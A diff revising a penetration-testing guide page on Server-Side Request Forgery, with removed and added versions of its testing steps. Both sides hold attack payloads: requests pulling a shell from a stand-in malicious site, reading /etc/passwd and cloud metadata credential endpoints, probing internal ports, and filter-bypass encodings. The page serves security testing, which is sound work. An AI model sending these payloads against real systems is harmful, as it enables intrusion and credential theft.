@@ -1,58 +1,64 @@
-WSTG-INPV-19: Testing for Server-Side Request Forgery (SSRF)
+WSTG-INPV-19: Testing for Server-Side Request Forgery
 
-Summary:
-Server-Side Request Forgery (SSRF) occurs when an application fetches a remote resource based on user-supplied URL or hostname without adequately validating the destination. This allows attackers to induce the server to make requests to internal infrastructure, cloud metadata services, or other unintended destinations, bypassing network perimeter controls.
+## Summary
+Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).
 
-Test Objectives:
-- Identify all application features where the server makes outbound HTTP requests based on user input
-- Test whether the server can be directed to make requests to internal IP addresses
-- Test access to cloud metadata endpoints (AWS, GCP, Azure)
+## Test Objectives
+- Identify SSRF injection points.
+- Test if the injection points are exploitable.
+- Asses the severity of the vulnerability.
 
-How to Test:
+## How to Test
+When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.
 
-1. Identify SSRF-Prone Features
-   - URL import or fetch functionality (import from URL, load image from URL)
-   - Webhook configuration endpoints
-   - PDF generators that render user-supplied URLs
-   - Social media preview / link unfurling features
-   - File upload from URL (upload by URL)
-   - Server-side HTTP proxies, API gateways with configurable backends
-   - Any parameter named: url, uri, link, src, path, host, endpoint, callback
+Consider the following request:
 
-2. Basic SSRF Detection
-   - Replace URL parameter with Burp Collaborator URL: ?url=https://collaborator.burp.com/
-   - Monitor for incoming HTTP requests to confirm server-side fetch
-   - Try http://127.0.0.1:8080 or http://localhost/admin to access local services
+``` http
+GET https://example.com/page?page=about.php
+```
 
-3. Internal Network Scanning via SSRF
-   - Probe private IP ranges: http://10.0.0.1, http://172.16.0.1, http://192.168.1.1
-   - Port scanning: http://192.168.1.1:22, http://192.168.1.1:3306 (distinguish open/closed by response timing or error messages)
+You can test this request with the following payloads.
 
-4. Cloud Metadata Exfiltration
-   - AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
-   - GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
-   - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (requires Metadata: true header)
+### Load the Contents of a File
 
-5. Bypass Techniques
-   - DNS rebinding: use a domain that resolves to 127.0.0.1
-   - IPv6: http://[::1]/ or http://[::ffff:127.0.0.1]/
-   - URL encoding: http://%31%32%37%2e%30%2e%30%2e%31/
-   - Decimal notation: http://2130706433/ (decimal of 127.0.0.1)
-   - Redirect bypass: use attacker server that returns 301 redirect to 127.0.0.1
+```http
+GET https://example.com/page?page=https://malicioussite.com/shell.php
+```
 
-6. Blind SSRF (No Response Reflection)
-   - Use out-of-band channels: Burp Collaborator, interactsh, canarytokens.org
-   - Observe DNS queries and HTTP callbacks to confirm server-side fetch
+### Access a Restricted Page
 
-Tools:
-   - Burp Suite Collaborator / Interactsh: OOB SSRF detection
-   - SSRFmap: automated SSRF exploitation
-   - Gopherus: SSRF to protocol exploitation (gopher://)
+```http
+GET https://example.com/page?page=http://localhost/admin
+```
 
-Expected Secure Behavior (Pass Conditions):
-- Server validates URL against strict allowlist of permitted domains/IPs
-- Private IP ranges and localhost are blocked at application or network level
-- Server does not follow HTTP redirects to blocked destinations
-- Cloud metadata endpoints (169.254.169.254) are inaccessible
-- Egress firewall rules prevent application server from reaching unintended destinations
-- DNS resolution validated against IP allowlist after resolution (to prevent DNS rebinding)
+Or:
+
+```http
+GET https://example.com/page?page=http://127.0.0.1/admin
+```
+
+Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.
+
+These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.
+
+### Fetch a Local File
+
+```http
+GET https://example.com/page?page=file:///etc/passwd
+```
+
+### HTTP Methods Used
+
+All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
+
+One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.
+
+You can find more on Blind SSRF here, or in the references section.
+
+### PDF Generators
+
+In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.
+
+```html
+<iframe src="file:///etc/passwd" width="400" height="400">
+[...truncated]
